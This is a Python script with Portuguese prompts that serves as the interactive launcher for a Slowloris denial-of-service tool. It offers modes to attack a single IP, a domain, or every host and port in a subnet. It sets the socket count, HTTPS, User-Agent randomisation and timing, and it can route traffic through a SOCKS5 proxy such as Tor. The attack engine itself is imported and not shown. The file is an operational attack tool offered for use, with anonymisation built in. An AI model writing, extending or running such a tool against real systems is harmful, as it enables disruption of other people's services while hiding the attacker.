#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
from src.slowloris_tool.cli import main as cli_main


def ask(prompt: str, default: str = None) -> str:
    if default is None:
        return input(f"{prompt}: ").strip()
    val = input(f"{prompt} [{default}]: ").strip()
    return val or default


def interactive_menu():
    print("Slowloris – selecione o modo:")
    print("1) sniper (IP único)")
    print("2) domain (domínio)")
    print("3) pitchfork (sub-rede/portas)")
    choice = input("> ").strip()
    if choice == "1":
        sys.argv.append("sniper")
        ip = ask("IP de destino")
        port = ask("Porta", "80")
        socks = ask("SOCKS5 (ex.: 127.0.0.1:9050) ou deixe vazio", "")
        sys.argv += ["-p", port]
        if socks:
            sys.argv += ["--socks5", socks]
        sys.argv += ["-s", ask("Nº de sockets", "200")]
        if ask("Usar HTTPS? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["--https"]
        if ask("Randomizar User-Agent? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["-ua"]
        sys.argv += ["--sleeptime", ask("Intervalo entre headers (s)", "15")]
        sys.argv.append(ip)
    elif choice == "2":
        sys.argv.append("domain")
        host = ask("Domínio (sem protocolo)")
        port = ask("Porta", "80")
        socks = ask("SOCKS5 (ex.: 127.0.0.1:9050) ou deixe vazio", "")
        sys.argv += ["-p", port]
        if socks:
            sys.argv += ["--socks5", socks]
        sys.argv += ["-s", ask("Nº de sockets", "200")]
        if ask("Usar HTTPS? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["--https"]
        if ask("Randomizar User-Agent? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["-ua"]
        sys.argv += ["--sleeptime", ask("Intervalo entre headers (s)", "15")]
        sys.argv.append(host)
    elif choice == "3":
        sys.argv.append("pitchfork")
        sys.argv.append(ask("Sub-rede CIDR (ex.: 192.168.0.0/24)"))
        sys.argv += ["-P", ask("Portas (CSV)", "80,443,8080")]
        sys.argv += ["-s", ask("Nº de sockets por IP/porta", "200")]
        if ask("Usar HTTPS? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["--https"]
        if ask("Randomizar User-Agent? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["-ua"]
        sys.argv += ["-t", ask("Máximo de threads", "50")]
        sys.argv += ["-d", ask("Duração do teste (s)", "120")]
    else:
        print("Opção inválida.")
        sys.exit(1)


def main():
    if len(sys.argv) == 1:
        interactive_menu()
    cli_main()


if __name__ == "__main__":
    main()
